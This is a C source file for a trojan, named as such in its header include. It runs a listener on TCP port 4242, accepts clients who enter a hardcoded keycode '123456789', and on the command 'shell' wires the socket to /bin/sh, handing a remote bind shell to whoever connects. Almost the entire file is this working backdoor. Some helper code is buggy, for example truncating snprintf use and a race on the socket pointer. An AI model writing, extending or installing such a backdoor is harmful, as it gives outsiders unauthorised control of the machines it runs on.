#include "trojan.h"

#define MAX_CLIENTS 3

int active_connections = 0;
int sig; 

void sig_handler(int signal) {
    sig = signal;
}

void format_response(char *dest, char *src) {
    memset(dest, 0, 1024);
    snprintf(dest, strlen(src), "%s", src);
}

int handle_recv(int client_socket) {
    char response[1024];
    char buffer[1024];

    while (1) {
        send(client_socket, "$> ", 3, 0);
        memset(buffer, 0, 1024);
        ssize_t valread = read(client_socket, buffer, sizeof(buffer) - 1);
        if (valread <= 0 || sig == SIGPIPE) {
            break ;
        }
        buffer[valread] = '\0';
        if (!strncmp(buffer, "shell", strlen("shell"))) {
            pid_t pid = fork();
            if (pid == 0) {
                dup2(client_socket, 0);
                dup2(client_socket, 1);
                dup2(client_socket, 2);
                char * const argv[] = {"/bin/sh", NULL};
                execve("/bin/sh", argv, NULL);
            }
            waitpid(pid, NULL, 0);
        } else {
            format_response(response,"Command not found\n");
            send(client_socket, response, strlen(response), 0);
        } 
        if (!strncmp(buffer, "quit", 4)) {
            break ;
        }
    }
    return 1;
}

void *handle_client(void *arg)
{
    int client_socket = *(int *)arg;
    char buffer[1024];
    char keycode[1024] = "123456789";
    char response[1024];
    memset(buffer, 0, 1024);

    while (1) {
        ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
        buffer[valread] = '\0';
        printf("%s\n", buffer);
        break ;
    }
    while (1) {
        memset(buffer, 0, 1024);
        format_response(response, "Enter the keycode: ");
        send(client_socket, response, strlen(response), 0);
        ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
        buffer[valread] = '\0';
        if (sig == SIGPIPE || valread <= 0)
            break ;
        if (!strncmp(buffer, keycode, strlen(keycode))) {
            format_response(response, "Connection established, welcome\n");
            send(client_socket, response, strlen(response), 0);
            if (handle_recv(client_socket))
                break ;
        } else {
            format_response(response, "Connection failed\n\n");
            send(client_socket, response, strlen(response), 0);
        }
    }

    close(client_socket);
    active_connections--;

    return NULL;
}

void start_socket_listener()
{
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(4242);

    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, MAX_CLIENTS);

    printf("Server listening on port 4242\n");

    while (1)
    {
        int new_socket;
        socklen_t addrlen = sizeof(address);

        new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
        printf("New connection attempt...\n");

        if (active_connections >= MAX_CLIENTS) {
            send(new_socket, "Connection refused\n", strlen("Connection refused\n"), 0);
            close(new_socket);
            continue;
        }
        active_connections++;

        pthread_t thread_id;
        pthread_create(&thread_id, NULL, handle_client, &new_socket);
        pthread_detach(thread_id);
    }

    close(server_fd);
}

int main(int ac, char **av) {
    (void)ac;
    (void)av;
    signal(SIGPIPE, sig_handler); 
    start_socket_listener();
    return 0;
}